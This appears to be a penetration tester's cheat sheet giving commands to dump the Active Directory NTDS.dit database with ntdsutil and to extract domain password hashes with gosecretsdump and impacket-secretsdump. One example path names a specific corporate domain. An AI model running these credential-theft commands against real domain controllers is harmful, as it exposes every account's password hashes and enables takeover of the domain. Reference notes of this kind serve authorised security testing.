# NTDS.dit Dump
## [ntdsutil](https://github.com/clr2of8/DPAT)
```sh
ntdsutil "ac in ntds" "ifm" "cr fu c:\temp" q q
```

# NTDS.dit Extract
## [gosecretsdump](https://github.com/C-Sto/gosecretsdump)
```sh
gosecretsdump -enabled -noprint  -ntds [ntds.dit] -system [SYSTEM] -out [ntlm.domain.txt]
```

## [secretsdump](/Tools/impacket.md)
```sh
impacket-secretsdump -user-status -system ./corp.storebrand.no/registry/SYSTEM -ntds ./corp.storebrand.no/Active\ Directory/ntds.dit LOCAL | grep '(status=Enabled)' | sed 's/(status\=Enabled)//'
```
